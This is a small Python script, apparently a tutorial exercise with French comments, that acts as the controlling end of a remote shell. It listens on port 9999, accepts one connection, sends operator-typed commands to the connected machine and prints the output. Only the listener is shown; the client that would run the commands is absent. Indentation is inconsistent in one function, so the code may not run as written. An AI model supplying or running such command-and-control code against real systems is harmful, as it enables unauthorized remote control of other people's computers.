import socket
import sys

# socket 2 connection
def create_socket():
	try:
                global host
                global port
                global s
                host = ''
                port = 9999


                s = socket.socket() # Converstionn entre deux clients
	except socket.error as msg:
		print("Error creating socket: " + str(msg))

#listener
def socket_bind():
	try:
		global host
		global port
		global s
		print("Binding socket to port: " + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("Error binding socket to port: " + str(msg) + "\n" + "Retrying...")
		socket_bind()

#connexion etablie
def socket_accept():
	conn, address = s.accept()
	print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
	send_commands(conn)
	conn.close()


def send_commands(conn):
	while True:
		cmd = input()
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		if len(str.encode(cmd)) > 0: 
			conn.send(str.encode(cmd))
			client_response = str(conn.recv(1024), "utf-8")
			print(client_response, end="")

def main():
	create_socket()
	socket_bind()
	socket_accept()

main()



